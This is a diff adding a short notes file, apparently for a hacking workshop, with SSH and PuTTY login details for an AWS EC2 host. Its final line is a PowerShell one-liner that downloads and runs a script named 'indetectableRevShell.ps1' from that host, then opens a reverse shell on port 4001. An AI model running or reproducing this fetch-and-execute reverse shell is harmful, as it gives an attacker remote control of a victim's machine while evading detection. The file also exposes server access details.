@@ -1,0 +1,11 @@
+Linux:
+
+ssh -i "c1b3rtr4cks_taller.pem" c1b3rtr4cks@ec2-18-192-8-12.eu-central-1.compute.amazonaws.com
+
+Windows (Putty):
+
+IP: ec2-18-192-8-12.eu-central-1.compute.amazonaws.com
+User: c1b3rtr4cks
+Putty > Connection > SSH > Auth > Browse private key ppk
+
+IEX (New-Object Net.WebClient).DownloadString('https://ec2-18-192-8-12.eu-central-1.compute.amazonaws.com/indetectableRevShell.ps1'); inversa -Reverse -IPAddress 0.0.0.0 -Port 4001
